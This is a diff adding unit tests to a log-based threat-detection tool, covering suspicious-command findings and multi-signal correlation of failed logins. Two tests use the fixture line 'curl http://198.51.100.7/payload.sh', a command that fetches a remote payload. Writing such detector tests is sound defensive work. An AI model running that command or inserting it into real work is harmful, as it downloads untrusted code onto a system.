@@ -64,6 +64,71 @@ class RuleTests(unittest.TestCase):
         findings = detect_findings(events, config)
         self.assertTrue(any(f.rule_id == "correlation.brute_force" for f in findings))
 
+    def test_suspicious_command_finding_includes_reasons(self):
+        events = [
+            Event(
+                source_file="app.log",
+                line_number=1,
+                raw_line="user ran curl http://198.51.100.7/payload.sh",
+                category="command",
+                actor="alice",
+                source_address="192.0.2.10",
+                message="curl http://198.51.100.7/payload.sh",
+            )
+        ]
+
+        findings = detect_findings(events, default_config())
+
+        suspicious = [finding for finding in findings if finding.rule_id.startswith("behavior.")]
+        self.assertTrue(suspicious)
+        self.assertIsNotNone(suspicious[0].severity_reason)
+        self.assertIsNotNone(suspicious[0].confidence_reason)
+
+    def test_multi_signal_actor_creates_correlated_behavior_finding(self):
+        events = [
+            Event(
+                "auth.log",
+                1,
+                "Failed password for root from 192.0.2.10",
+                category="auth",
+                actor="root",
+                source_address="192.0.2.10",
+                message="Failed password",
+            ),
+            Event(
+                "auth.log",
+                2,
+                "Invalid user admin from 192.0.2.10",
+                category="auth",
+                actor="admin",
+                source_address="192.0.2.10",
+                message="Invalid user",
+            ),
+        ]
+
+        findings = detect_findings(events, default_config())
+
+        self.assertTrue(
+            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
+        )
+
+    def test_single_suspicious_command_does_not_create_multi_signal_finding(self):
+        event = Event(
+            source_file="app.log",
+            line_number=1,
+            raw_line="user ran curl http://198.51.100.7/payload.sh",
+            category="command",
+            actor="alice",
+            source_address="192.0.2.10",
+            message="curl http://198.51.100.7/payload.sh",
+        )
+
+        findings = detect_findings([event], default_config())
+
+        self.assertFalse(
+            any(finding.rule_id == "behavior.multi_signal_source" for finding in findings)
+        )
+
     def test_json_rule_file_is_loaded(self):
         with TemporaryDirectory() as tmp:
             path = Path(tmp) / "rules.json"
